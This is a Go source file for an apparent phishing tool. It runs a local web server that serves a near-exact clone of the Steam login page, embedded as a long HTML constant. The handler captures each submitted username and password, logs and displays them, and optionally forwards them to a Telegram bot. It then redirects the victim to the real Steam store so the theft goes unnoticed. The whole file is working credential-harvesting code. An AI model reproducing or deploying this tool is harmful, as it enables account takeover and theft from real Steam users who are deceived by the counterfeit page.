package main

import (
	"context"
	"fmt"
	"log"
	"net/http"

	"fyne.io/fyne"
	"fyne.io/fyne/dialog"
	"fyne.io/fyne/widget"
	"github.com/raifpy/Go/errHandler"
)

func serveSteamLogin(kapat chan bool, win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
	serveFunc := func(response http.ResponseWriter, req *http.Request) {
		log.Println("Requests -> ", req.Form.Encode())
		//query := req.URL.Query()
		//if key, ok := query["nick"]; ok {
		if !errHandler.HandlerBool(req.ParseForm()) {
			login := req.FormValue("username")
			pass := req.FormValue("password")

			if login != "" || pass != "" {
				log.Printf("Login = %s  Passw = %s", login, pass)
				*textStream += "\nlogin = " + login + "\nPass = " + pass + "\n"
				if useTelegramBot {
					tg.send("Login = " + login + "\nPass = " + pass)
				}
				textGrid.SetText(*textStream)
				notiApp.SendNotification(fyne.NewNotification("New Form", login+" : "+pass))
				http.Redirect(response, req, "https://store.steampowered.com", 301)
				return
			}
			*textStream += "New Requests\n"
			if useTelegramBot {
				tg.send("New Request on steam")
			}
			textGrid.SetText(*textStream)
		} else {
			log.Println("Error to req.ParseFrom")
		}

		fmt.Fprintln(response, steamLogin)
		return
	}
	/*http.HandleFunc("/", serveFunc)
	err := http.ListenAndServe(":8089", nil)
	dialog.ShowError(err, win)*/
	m := http.NewServeMux()
	s := http.Server{Addr: ":8089", Handler: m}
	m.HandleFunc("/", serveFunc)

	go func() {
		<-kapat
		s.Shutdown(context.Background())
		fmt.Println("Server Shutdown")

	}()

	if err := s.ListenAndServe(); errHandler.HandlerBool(err)  && err.Error() != serverClosedErrString{
		if useTelegramBot {
			tg.send(err.Error())
		}
		dialog.ShowError(err, win)
	}
}

const steamLogin = `
<!DOCTYPE html>
<html class=" responsive" lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
			<meta name="viewport" content="width=device-width,initial-scale=1">
		<meta name="theme-color" content="#171a21">
		<title>Login</title>
	<link rel="shortcut icon" href="https://store.steampowered.com/favicon.ico" type="image/x-icon">

	
	
<link href="https://steamstore-a.akamaihd.net/public/shared/css/motiva_sans.css?v=GvhJzpHNW-hA&amp;l=english" rel="stylesheet" type="text/css" >
<link href="https://steamstore-a.akamaihd.net/public/shared/css/shared_global.css?v=8auqH9wO7vE-&amp;l=english" rel="stylesheet" type="text/css" >
<link href="https://steamstore-a.akamaihd.net/public/shared/css/buttons.css?v=l3li_MNwxNDv&amp;l=english" rel="stylesheet" type="text/css" >
<link href="https://steamstore-a.akamaihd.net/public/css/v6/store.css?v=9V_hfc4YTTDH&amp;l=english" rel="stylesheet" type="text/css" >
<link href="https://steamstore-a.akamaihd.net/public/css/v6/store_rewards_header.css?v=RS7Ct0ERSy_A&amp;l=english" rel="stylesheet" type="text/css" >
<link href="https://steamstore-a.akamaihd.net/public/css/v6/cart.css?v=dNzRh4M56a0H&amp;l=english" rel="stylesheet" type="text/css" >
<link href="https://steamstore-a.akamaihd.net/public/css/v6/browse.css?v=7hoqLVcZ7KVq&amp;l=english" rel="stylesheet" type="text/css" >
<link href="https://steamstore-a.akamaihd.net/public/css/v6/login.css?v=7P0uzhSYUThm&amp;l=english" rel="stylesheet" type="text/css" >
<link href="https://steamstore-a.akamaihd.net/public/shared/css/login.css?v=8waxcT4JOLpy&amp;l=english" rel="stylesheet" type="text/css" >
<link href="https://steamstore-a.akamaihd.net/public/shared/css/shared_responsive.css?v=AKHr_xXe1lDr&amp;l=english" rel="stylesheet" type="text/css" >
<script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/shared/javascript/jquery-1.8.3.min.js?v=.TZ2NKhB-nliU" ></script>
<script type="text/javascript">$J = jQuery.noConflict();</script><script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/shared/javascript/tooltip.js?v=.9Z1XDV02xrml" ></script>

<script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/shared/javascript/shared_global.js?v=VDA626u7Usc5&amp;l=english" ></script>

<script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/javascript/main.js?v=WL5cUbha5q2M&amp;l=english" ></script>

<script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/javascript/dynamicstore.js?v=3IhZcJIUORy9&amp;l=english" ></script>

<script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/shared/javascript/login.js?v=tyUkU6Wkwq4v&amp;l=english" ></script>
<script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/shared/javascript/shared_responsive_adapter.js?v=TbBMCK37KgCo&amp;l=english" ></script>

						<meta name="twitter:card" content="summary_large_image">
			
	<meta name="twitter:site" content="@steam" />

						<meta property="og:title" content="Login">
					<meta property="twitter:title" content="Login">
					<meta property="og:type" content="website">
					<meta property="fb:app_id" content="105386699540688">
					<meta property="og:site" content="Steam">
			
	
			<link rel="image_src" href="https://steamstore-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png">
		<link rel="image_src" href="https://steamstore-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png">
		<meta property="og:image" content="https://steamstore-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png">
		<meta name="twitter:image" content="https://steamstore-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png" />
					<meta property="og:image:secure" content="https://steamstore-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png">
		
	
	
	
	</head>
<body class="v6 login responsive_page">

<div class="responsive_page_frame with_header">

						<div class="responsive_page_menu_ctn mainmenu">
				<div class="responsive_page_menu"  id="responsive_page_menu">
										<div class="mainmenu_contents">
						<div class="mainmenu_contents_items">
															<a class="menuitem" href="https://store.steampowered.com/login/?redir=login%2F&redir_ssl=1&snr=1_60_4__global-header">
									Login								</a>
								<a class="menuitem supernav" href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
		Store	</a>
	<div class="submenu_store" style="display: none;" data-submenuid="store">
		<a class="submenuitem" href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu">Home</a>
		<a class="submenuitem" href="https://store.steampowered.com/explore/?snr=1_60_4__global-responsive-menu">Discovery Queue</a>		
		<a class="submenuitem" href="https://steamcommunity.com/my/wishlist/">Wishlist</a>
		<a class="submenuitem" href="https://store.steampowered.com/points/shop/?snr=1_60_4__global-responsive-menu">Points Shop</a>	
       	<a class="submenuitem" href="https://store.steampowered.com/news/?snr=1_60_4__global-responsive-menu">News</a>
		<a class="submenuitem" href="https://store.steampowered.com/stats/?snr=1_60_4__global-responsive-menu">Stats</a>
			</div>


	<a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
		Community	</a>
	<div class="submenu_community" style="display: none;" data-submenuid="community">
		<a class="submenuitem" href="https://steamcommunity.com/">Home</a>
		<a class="submenuitem" href="https://steamcommunity.com/discussions/">Discussions</a>
		<a class="submenuitem" href="https://steamcommunity.com/workshop/">Workshop</a>
		<a class="submenuitem" href="https://steamcommunity.com/market/">Market</a>
		<a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Broadcasts</a>
							</div>

	

	
	
	<a class="menuitem" href="https://help.steampowered.com/en/">
		Support	</a>

							<div class="minor_menu_items">
																<div class="menuitem change_language_action">
									Change language								</div>
																									<div class="menuitem" onclick="Responsive_RequestDesktopView();">
										View desktop website									</div>
															</div>
						</div>
						<div class="mainmenu_footer_spacer"></div>
						<div class="mainmenu_footer">
							<div class="mainmenu_footer_logo"><img src="https://steamstore-a.akamaihd.net/public/shared/images/responsive/logo_valve_footer.png"></div>
							© Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.							<span class="mainmenu_valve_links">
								<a href="https://store.steampowered.com/privacy_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">Privacy Policy</a>
								&nbsp;| &nbsp;<a href="http://www.valvesoftware.com/legal.htm" target="_blank">Legal</a>
								&nbsp;| &nbsp;<a href="https://store.steampowered.com/subscriber_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">Steam Subscriber Agreement</a>
								&nbsp;| &nbsp;<a href="https://store.steampowered.com/steam_refunds/?snr=1_60_4__global-responsive-menu" target="_blank">Refunds</a>
							</span>
						</div>
					</div>
									</div>
			</div>
		
		<div class="responsive_local_menu_tab">

		</div>

		<div class="responsive_page_menu_ctn localmenu">
			<div class="responsive_page_menu"  id="responsive_page_local_menu">
				<div class="localmenu_content">
				</div>
			</div>
		</div>



					<div class="responsive_header">
				<div class="responsive_header_content">
					<div id="responsive_menu_logo">
						<img src="https://steamstore-a.akamaihd.net/public/shared/images/responsive/header_menu_hamburger.png" height="100%">
											</div>
					<div class="responsive_header_logo">
						<a href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu">
							<img src="https://steamstore-a.akamaihd.net/public/shared/images/responsive/header_logo.png" height="36" border="0" alt="STEAM">
						</a>
					</div>					
				</div>
			</div>
		
		<div class="responsive_page_content_overlay">

		</div>

		<div class="responsive_fixonscroll_ctn nonresponsive_hidden ">
		</div>
	
	<div class="responsive_page_content">

		<div id="global_header">
	<div class="content">
		<div class="logo">
			<span id="logo_holder">
									<a href="https://store.steampowered.com/?snr=1_60_4__global-header">
						<img src="https://steamstore-a.akamaihd.net/public/shared/images/header/globalheader_logo.png?t=962016" width="176" height="44">
					</a>
							</span>
			<!--[if lt IE 7]>
			<style type="text/css">
				#logo_holder img { filter:progid:DXImageTransform.Microsoft.Alpha(opacity=0); }
				#logo_holder { display: inline-block; width: 176px; height: 44px; filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://steamstore-a.akamaihd.net/public/images/v5/globalheader_logo.png'); }
			</style>
			<![endif]-->
		</div>

			<div class="supernav_container">
	<a class="menuitem supernav" href="https://store.steampowered.com/?snr=1_60_4__global-header" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
		STORE	</a>
	<div class="submenu_store" style="display: none;" data-submenuid="store">
		<a class="submenuitem" href="https://store.steampowered.com/?snr=1_60_4__global-header">Home</a>
		<a class="submenuitem" href="https://store.steampowered.com/explore/?snr=1_60_4__global-header">Discovery Queue</a>		
		<a class="submenuitem" href="https://steamcommunity.com/my/wishlist/">Wishlist</a>
		<a class="submenuitem" href="https://store.steampowered.com/points/shop/?snr=1_60_4__global-header">Points Shop</a>	
       	<a class="submenuitem" href="https://store.steampowered.com/news/?snr=1_60_4__global-header">News</a>
		<a class="submenuitem" href="https://store.steampowered.com/stats/?snr=1_60_4__global-header">Stats</a>
			</div>


	<a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
		COMMUNITY	</a>
	<div class="submenu_community" style="display: none;" data-submenuid="community">
		<a class="submenuitem" href="https://steamcommunity.com/">Home</a>
		<a class="submenuitem" href="https://steamcommunity.com/discussions/">Discussions</a>
		<a class="submenuitem" href="https://steamcommunity.com/workshop/">Workshop</a>
		<a class="submenuitem" href="https://steamcommunity.com/market/">Market</a>
		<a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Broadcasts</a>
							</div>

	

	
						<a class="menuitem" href="https://store.steampowered.com/about/?snr=1_60_4__global-header">
				ABOUT			</a>
			
	<a class="menuitem" href="https://help.steampowered.com/en/">
		SUPPORT	</a>
	</div>
		<div id="global_actions">
			<div id="global_action_menu">
									<div class="header_installsteam_btn header_installsteam_btn_green">

						<a class="header_installsteam_btn_content" href="https://store.steampowered.com/about/?snr=1_60_4__global-header">
							Install Steam						</a>
					</div>
				
				
														<a class="global_action_link" href="https://store.steampowered.com/login/?redir=login%2F&redir_ssl=1&snr=1_60_4__global-header">login</a>
											&nbsp;|&nbsp;
						<span class="pulldown global_action_link" id="language_pulldown" onclick="ShowMenu( this, 'language_dropdown', 'right' );">language</span>
						<div class="popup_block_new" id="language_dropdown" style="display: none;">
							<div class="popup_body popup_menu">
																																					<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=schinese" onclick="ChangeLanguage( 'schinese' ); return false;">简体中文 (Simplified Chinese)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=tchinese" onclick="ChangeLanguage( 'tchinese' ); return false;">繁體中文 (Traditional Chinese)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=japanese" onclick="ChangeLanguage( 'japanese' ); return false;">日本語 (Japanese)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=koreana" onclick="ChangeLanguage( 'koreana' ); return false;">한국어 (Korean)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=thai" onclick="ChangeLanguage( 'thai' ); return false;">ไทย (Thai)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=bulgarian" onclick="ChangeLanguage( 'bulgarian' ); return false;">Български (Bulgarian)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=czech" onclick="ChangeLanguage( 'czech' ); return false;">Čeština (Czech)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=danish" onclick="ChangeLanguage( 'danish' ); return false;">Dansk (Danish)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=german" onclick="ChangeLanguage( 'german' ); return false;">Deutsch (German)</a>
																																							<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=spanish" onclick="ChangeLanguage( 'spanish' ); return false;">Español - España (Spanish - Spain)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=latam" onclick="ChangeLanguage( 'latam' ); return false;">Español - Latinoamérica (Spanish - Latin America)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=greek" onclick="ChangeLanguage( 'greek' ); return false;">Ελληνικά (Greek)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=french" onclick="ChangeLanguage( 'french' ); return false;">Français (French)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=italian" onclick="ChangeLanguage( 'italian' ); return false;">Italiano (Italian)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=hungarian" onclick="ChangeLanguage( 'hungarian' ); return false;">Magyar (Hungarian)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=dutch" onclick="ChangeLanguage( 'dutch' ); return false;">Nederlands (Dutch)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=norwegian" onclick="ChangeLanguage( 'norwegian' ); return false;">Norsk (Norwegian)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=polish" onclick="ChangeLanguage( 'polish' ); return false;">Polski (Polish)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=portuguese" onclick="ChangeLanguage( 'portuguese' ); return false;">Português (Portuguese)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=brazilian" onclick="ChangeLanguage( 'brazilian' ); return false;">Português - Brasil (Portuguese - Brazil)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=romanian" onclick="ChangeLanguage( 'romanian' ); return false;">Română (Romanian)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=russian" onclick="ChangeLanguage( 'russian' ); return false;">Русский (Russian)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=finnish" onclick="ChangeLanguage( 'finnish' ); return false;">Suomi (Finnish)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=swedish" onclick="ChangeLanguage( 'swedish' ); return false;">Svenska (Swedish)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=turkish" onclick="ChangeLanguage( 'turkish' ); return false;">Türkçe (Turkish)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=vietnamese" onclick="ChangeLanguage( 'vietnamese' ); return false;">Tiếng Việt (Vietnamese)</a>
																													<a class="popup_menu_item tight" href="https://store.steampowered.com/login/?l=ukrainian" onclick="ChangeLanguage( 'ukrainian' ); return false;">Українська (Ukrainian)</a>
																									<a class="popup_menu_item tight" href="http://translation.steampowered.com" target="_blank">Help us translate Steam</a>
							</div>
						</div>
												</div>
					</div>
			</div>
</div>
<div id="responsive_store_nav_ctn"></div><div data-cart-banner-spot="1"></div>
		<div class="responsive_page_template_content">

	<div class="responsive_store_nav_ctn_spacer">
		
		<div id="store_header" class="">
		<div class="content">
			<div id="store_controls">
				<div id="cart_status_data">
																					<div class="store_header_btn_green store_header_btn" id="store_header_cart_btn" style="display: none;">
							<div class="store_header_btn_caps store_header_btn_leftcap"></div>
							<div class="store_header_btn_caps store_header_btn_rightcap"></div>
							<a id="cart_link" class="store_header_btn_content" href="https://store.steampowered.com/cart/?snr=1_60_4__12">
								Cart								(<span id="cart_item_count_value">0</span>)
							</a>
						</div>
									</div>
			</div>
						
												<div id="store_nav_area">
					<div class="store_nav_leftcap"></div>
					<div class="store_nav_bg">
						<div class="store_nav">

													<div class="tab  flyout_tab " id="foryou_tab" data-flyout="foryou_flyout" data-flyout-align="left" data-flyout-valign="bottom" onmouseover="EnsureStoreMenuTagsLoaded( '#foryou_yourtags' );">
								<span class="pulldown">
									<a class="pulldown_desktop" href="https://store.steampowered.com/?snr=1_60_4__12">Your Store</a>
									<span></span>
								</span>
							</div>
							<div class="popup_block_new flyout_tab_flyout responsive_slidedown" id="foryou_flyout" style="display: none;">
								<div class="popup_body popup_menu">
									<a class="popup_menu_item" href="https://store.steampowered.com/?snr=1_60_4__12">
										Home									</a>
									<div class="hr"></div>
                                                                            <a class="popup_menu_item" href="https://store.steampowered.com/communityrecommendations/?snr=1_60_4__12">
                                            Community Recommendations                                        </a>
                                    									<a class="popup_menu_item" href="https://store.steampowered.com/recommended/?snr=1_60_4__12">
										Recently Viewed									</a>
                                                                            <a class="popup_menu_item" href="https://store.steampowered.com/curators/?snr=1_60_4__12">
                                            Steam Curators                                        </a>
                                    								</div>
							</div>
						

															<div class="tab  flyout_tab " id="genre_tab" data-flyout="genre_flyout" data-flyout-align="left" data-flyout-valign="bottom">
									<span class="pulldown">
										<a class="pulldown_desktop" href="https://store.steampowered.com/games/?snr=1_60_4__12">Browse</a>
										<a class="pulldown_mobile" href="https://store.steampowered.com/login/#">Browse</a>
										<span></span>
									</span>
								</div>
								<div class="popup_block_new flyout_tab_flyout responsive_slidedown" id="genre_flyout" style="display: none;">
									<div class="popup_body popup_menu_twocol">
										<div class="popup_menu">
																																															<a class="popup_menu_item" href="https://store.steampowered.com/genre/Free%20to%20Play/?snr=1_60_4__12">
														Free to Play													</a>
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																												<a class="popup_menu_item" href="https://store.steampowered.com/genre/Early%20Access/?snr=1_60_4__12">
														Early Access													</a>
																																																																																																																																																																																																																																																																																															<a class="popup_menu_item" href="https://store.steampowered.com/demos/?snr=1_60_4__12">
												<span>Demos</span>
											</a>

																							<a class="popup_menu_item" href="https://store.steampowered.com/vr/?snr=1_60_4__12">
													<span>Virtual Reality</span>
												</a>
																																		<a class="popup_menu_item" href="https://store.steampowered.com/controller/?snr=1_60_4__12">
													<span>Controller Friendly</span>
												</a>
																																		<a class="popup_menu_item" href="https://store.steampowered.com/pccafe/?snr=1_60_4__12">
													<span>For PC Cafés</span>
												</a>
																																	<a class="popup_menu_item" href="https://store.steampowered.com/remoteplay_hub/?snr=1_60_4__12">
												<span>Remote Play</span>
											</a>
																																	<a class="popup_menu_item" href="https://store.steampowered.com/valveindex/?snr=1_60_4__12">
												<span>Valve Index®</span>
											</a>
																																	<div class="hr"></div>
											<div class="popup_menu_subheader">Platforms</div>
											<a class="popup_menu_item" href="https://store.steampowered.com/macos?snr=1_60_4__12">
												Mac OS X											</a>
											<a class="popup_menu_item" href="https://store.steampowered.com/linux?snr=1_60_4__12">
												SteamOS + Linux											</a>
											<div class="hr"></div>
											<div class="popup_menu_subheader">Additional Content</div>
											<a class="popup_menu_item" href="https://store.steampowered.com/soundtracks?snr=1_60_4__12">
												Soundtracks											</a>
										</div>
										<div class="popup_menu">
											<div class="popup_menu_subheader">Game Genres</div>

																																				<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Action/?snr=1_60_4__12">
														Action													</a>
																																																<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Adventure/?snr=1_60_4__12">
														Adventure													</a>
																																																<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Casual/?snr=1_60_4__12">
														Casual													</a>
																																																																																														<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Indie/?snr=1_60_4__12">
														Indie													</a>
																																																<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Massively%20Multiplayer/?snr=1_60_4__12">
														Massively Multiplayer													</a>
																																																<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Racing/?snr=1_60_4__12">
														Racing													</a>
																																																<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/RPG/?snr=1_60_4__12">
														RPG													</a>
																																																<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Simulation/?snr=1_60_4__12">
														Simulation													</a>
																																																<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Sports/?snr=1_60_4__12">
														Sports													</a>
																																																<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Strategy/?snr=1_60_4__12">
														Strategy													</a>
																							
																							<div class="hr"></div>
												<a class="popup_menu_item" href="https://store.steampowered.com/tag/browse/?snr=1_60_4__12">
													More Popular Tags...												</a>
																					</div>
										<!-- Software third column -->

																					<div class="popup_menu">
												<div class="popup_menu_subheader">Software</div>
																									<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Animation%20%26%20Modeling/?snr=1_60_4__12">
														Animation & Modeling													</a>
																									<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Audio%20Production/?snr=1_60_4__12">
														Audio Production													</a>
																									<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Design%20%26%20Illustration/?snr=1_60_4__12">
														Design & Illustration													</a>
																									<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Education/?snr=1_60_4__12">
														Education													</a>
																									<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Game%20Development/?snr=1_60_4__12">
														Game Development													</a>
																									<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Photo%20Editing/?snr=1_60_4__12">
														Photo Editing													</a>
																									<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Utilities/?snr=1_60_4__12">
														Utilities													</a>
																									<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Video%20Production/?snr=1_60_4__12">
														Video Production													</a>
																									<a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Web%20Publishing/?snr=1_60_4__12">
														Web Publishing													</a>
																							</div>
										
									</div>
								</div>
							
                            <!--                                                                 <div class="tab  flyout_tab " id="software_tab" data-flyout="software_flyout" data-flyout-align="left" data-flyout-valign="bottom">
                                    <span class="pulldown">
                                        <a class="pulldown_desktop" href="https://store.steampowered.com/software/?snr=1_60_4__12">Software</a>
                                        <a class="pulldown_mobile" href="https://store.steampowered.com/login/#">Software</a>
                                        <span></span>
                                    </span>
                                </div>

                                <div class="popup_block_new flyout_tab_flyout responsive_slidedown" id="software_flyout" style="display: none;">
                                    <div class="popup_body popup_menu">
                                        <a class="popup_menu_item" href="https://store.steampowered.com/software/?snr=1_60_4__12">
                                            Software                                        </a>
                                        <div class="hr"></div>
                                                                                    <a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Animation%20%26%20Modeling/?snr=1_60_4__12">
                                                Animation & Modeling                                            </a>
                                                                                    <a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Audio%20Production/?snr=1_60_4__12">
                                                Audio Production                                            </a>
                                                                                    <a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Design%20%26%20Illustration/?snr=1_60_4__12">
                                                Design & Illustration                                            </a>
                                                                                    <a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Education/?snr=1_60_4__12">
                                                Education                                            </a>
                                                                                    <a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Game%20Development/?snr=1_60_4__12">
                                                Game Development                                            </a>
                                                                                    <a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Photo%20Editing/?snr=1_60_4__12">
                                                Photo Editing                                            </a>
                                                                                    <a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Utilities/?snr=1_60_4__12">
                                                Utilities                                            </a>
                                                                                    <a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Video%20Production/?snr=1_60_4__12">
                                                Video Production                                            </a>
                                                                                    <a class="popup_menu_item" href="https://store.steampowered.com/tags/en/Web%20Publishing/?snr=1_60_4__12">
                                                Web Publishing                                            </a>
                                        
                                    </div>
                                </div>
                             -->

                            <!--                                                                 <div class="tab  flyout_tab " id="hardware_tab" data-flyout="hardware_flyout" data-flyout-align="left" data-flyout-valign="bottom">
                                    <span class="pulldown">
                                        <a class="pulldown_desktop" href="https://store.steampowered.com/controller/?snr=1_60_4__12">Hardware</a>
                                        <a class="pulldown_mobile" href="https://store.steampowered.com/login/#">Hardware</a>
                                        <span></span>
                                    </span>
                                </div>
                                <div class="popup_block_new flyout_tab_flyout responsive_slidedown" id="hardware_flyout" style="display: none;">
                                    <div class="popup_body popup_menu">
                                   		 <a class="popup_menu_item" href="https://store.steampowered.com/valveindex?snr=1_60_4__12">
											Valve Index<sup>&reg;</sup>                                        </a>
                                        <a class="popup_menu_item" href="https://store.steampowered.com/app/353370/?snr=1_60_4__12">
                                            Steam Controller                                        </a>
                                        <a class="popup_menu_item" href="https://store.steampowered.com/app/358040/?snr=1_60_4__12">
                                            HTC Vive                                        </a>
                                    </div>
                                </div>
                             -->

							                                                                <a class="tab  " href="https://store.steampowered.com/points/?snr=1_60_4__12">
                                    <span>Points Shop</span>
                                </a>
                            
                                                        <a class="tab  " href="https://store.steampowered.com/news/?snr=1_60_4__12">
								<span>News</span>
							</a>


                                                                                            <a class="tab  " href="https://store.steampowered.com/labs/?snr=1_60_4__12">
                                    <span>Steam Labs</span>
                                </a>
                            
							<div class="search_area">
								<div id="store_search">
									<form id="searchform" name="searchform" method="post" action="/">
										
										<div class="searchbox">
											<input id="store_nav_search_term" name="term" type="text" class="default" placeholder="search the store" size="22" autocomplete="off">
											<a href="https://store.steampowered.com/login/#" id="store_search_link" onclick="var $Form = $J(this).parents('form'); $Form.submit(); return false;"><img src="https://steamstore-a.akamaihd.net/public/images/blank.gif"></a>
										</div>
									</form>
								</div>
								<div id="searchterm_options" class="search_suggest popup_block_new" style="display: none;">
									<div class="popup_body" style="border-top: none;">
										<div id="search_suggestion_contents">
										</div>
									</div>
								</div>
							</div>

						</div>
					</div>
					<div class="store_nav_rightcap"></div>
				</div>
							</div>
	</div>
				
	</div>

<div class="page_content">

	
	<!-- Center Column -->

	<div id="error_display" class="checkout_error" style="display: none; color: #cc3300">
	</div>

	<div class="leftcol">

		
		<div class="checkout_content_box">
			<div class="loginbox">
				<div class="loginbox_left">
					<div class="loginbox_content">
						<h2>Sign in</h2>
						<p>To an existing Steam account</p>
						<br>
						<form name="logon" action="/" method="post" id="login_form" style="display: none;">
							<div class="login_row">
								<div class="input_title">Steam account name</div>
								<input class="text_input" type="text" name="username" id="input_username" value="">
							</div>
							<div class="login_row">
								<div class="input_title">Password</div>
								<input class="text_input" type="password" name="password" id="input_password" autocomplete="off"/>
							</div>
														<div class="login_row" id="captcha_entry" style="display: none;">
								<div id="captcha_image_row">
									<img style="float: left;" id="captchaImg" src="https://steamstore-a.akamaihd.net/public/images/blank.gif" border="0" width="206" height="40">
									<div id="captchaRefresh">
										<span class="linkspan" id="captchaRefreshLink">Refresh</span>
									</div>
									<div style="clear: left;"></div>
								</div>
								<br>
								<div class="input_title">Enter the characters above</div>
								<input class="text_input" id="input_captcha" type="text" name="captcha_text">
							</div>
							<div style="display: none;"><input type="submit"></div>
							
							<div class="btn_ctn">
							<div id="login_btn_signin">
								<button type="submit" class="btnv6_blue_hoverfade  btn_medium">
									<span>Sign in</span>
								</button>
							</div>
						</form>

						<noscript><p>Javascript must be enabled to use this site</p></noscript>
						<script>
							document.getElementById('login_form').style.display = 'block';
						</script>
					</div>


						<div id="login_btn_wait" style="display: none;">
							<img src="https://steamstore-a.akamaihd.net/public/images/login/throbber.gif">
						</div>
					</div>
				</div>
				<div class="loginbox_sep">
				</div>
				<div class="loginbox_right">
					<div class="loginbox_content">
						<h2>Create</h2>
						<p>A new free account</p>
						<br>
						<p>
							It's free to join and easy to use.  Continue on to create your Steam account and get Steam, the leading digital solution for PC and Mac gamers.						</p>
						<div class="nonresponsive_hidden">
							<br>
							<p>
								<a target="_top" href="https://store.steampowered.com/about">Learn more about Steam.</a>
							</p>
						</div>
					</div>

					<a target="_top" href="https://store.steampowered.com/join/?&snr=1_60_4__62" class="btnv6_blue_hoverfade btn_medium">
						<span>Join Steam</span>
					</a>
				</div>
			</div>
		</div>
		<br>

		
		<a target="_top" href="https://help.steampowered.com/en/wizard/HelpWithLogin?redir=store%2Flogin%2F" id="link_forgot_password">
			Forgot your password?		</a>
		<br><br>

	</div>
	<!-- End Center Column -->

			<!-- Right Column -->
		<div class="rightcol">
			<div class="block">

				<div class="block_content block_content_inner login">
					<h2>WHY JOIN STEAM?</h2>
					<ul id="why_list">
						<li>Buy and download full retail games</li>
						<li>Join the Steam Community</li>
						<li>Chat with your friends while gaming</li>
						<li>Play your games on any supported platform</li>
						<li>Schedule a game, tournament, or LAN party</li>
						<li>Receive automatic game updates, and more!</li>
					</ul>
					<br />
					<img src="https://steamstore-a.akamaihd.net/public/images/v6/why_join_preview.png" width="265" height="176" border="0" >
					<br><br>
				</div>
				<div class="responsive_hidden">
					<br>
					<a target="_top" href="https://store.steampowered.com/about">Learn more about Steam.</a>
